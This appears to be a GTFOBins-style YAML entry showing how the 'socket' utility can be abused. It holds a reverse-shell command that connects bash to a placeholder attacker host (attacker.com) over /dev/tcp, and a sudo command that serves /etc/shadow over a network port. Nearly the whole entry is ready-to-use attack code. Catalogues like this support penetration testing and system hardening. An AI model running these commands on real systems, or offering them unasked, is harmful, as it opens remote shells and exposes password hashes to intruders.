---
description: Note that any shells are non-interactive. A reverse shell or similar is required to gain an interactive system shell.
functions:
  reverse-shell:
    - code: |
        LPORT=12345
        RPORT=11111
        RHOST=attacker.com
        socket -wslqvp "bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'" $LPORT
  sudo:
    - code: |
        LPORT=12345
        sudo socket -wslqvp "cat /etc/shadow " $LPORT
---
